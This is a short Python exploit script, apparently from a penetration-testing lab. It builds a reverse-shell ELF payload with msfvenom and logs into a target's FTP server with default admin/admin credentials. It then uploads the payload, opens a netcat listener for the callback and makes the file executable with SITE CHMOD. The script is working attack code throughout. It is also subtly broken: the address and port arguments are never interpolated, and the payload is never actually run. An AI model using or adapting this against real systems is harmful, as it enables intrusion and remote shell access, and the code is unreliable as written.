import subprocess
from ftplib import FTP
import time

TARGET = "192.168.71.X"  # Target
LHOST = "192.168.71.Y"  # Kali
LPORT = 4444
PAYLOAD = "shell.elf".strip()

res = subprocess.run(
    [
        "msfvenom",
        "-p",
        "linux/x64/shell_reverse_tcp",
        "LHOST={LHOST}",
        "LPORT={LPORT}",
        "-f",
        "elf",
        "-o",
        "shell.elf",
    ],
    capture_output=True,
    text=True,
)

print(res.stdout)
print(res.stderr)

ftp = None

try:
    print("Login")
    ftp = FTP(TARGET)
    ftp.set_debuglevel(2)
    ftp.login(user="admin", passwd="admin")
    ftp.set_pasv(True)
    print("SUCCESS")
except Exception as ex:
    print("Execution Failed")
    print(ex)
    exit(1)

print("UPLOAD PAYLOAD")

try:
    ftp.storbinary("STOR " + PAYLOAD, open(PAYLOAD, "rb"))
    print("SUCCESS")
except Exception as ex:
    print("Execution Failed")
    print(ex)
    exit(1)

print("NETCAT")
listener = subprocess.Popen(["nc", "-lvnp", str(LPORT)])
time.sleep(2)

print("EXECUTE PAYLOAD")
try:
    ftp.sendcmd("SITE CHMOD 755 " + PAYLOAD)
    print("CHMOD DONE")
    print("SUCCESS")
except:
    ftp.quit()

print("DONE")
